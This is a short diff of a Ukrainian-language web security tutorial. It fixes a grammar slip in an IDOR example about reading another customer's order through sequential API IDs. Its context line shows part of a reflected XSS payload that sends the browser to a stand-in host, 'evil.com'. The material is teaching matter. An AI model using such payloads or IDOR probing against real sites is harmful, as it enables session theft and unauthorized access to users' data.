@@ -277,7 +277,7 @@ https://shop.example/search?q=&lt;script&gt;document.location='https://evil.com/
         <section id="idor">
             <h2>7. IDOR та Broken Access Control</h2>
 
-            <pre><code>GET /api/orders/10001 → 200 OK  (мій замовлення)
+            <pre><code>GET /api/orders/10001 → 200 OK  (моє замовлення)
 GET /api/orders/10002 → 200 OK  (замовлення ІНШОГО клієнта!) ← IDOR
 
 Виправлення:
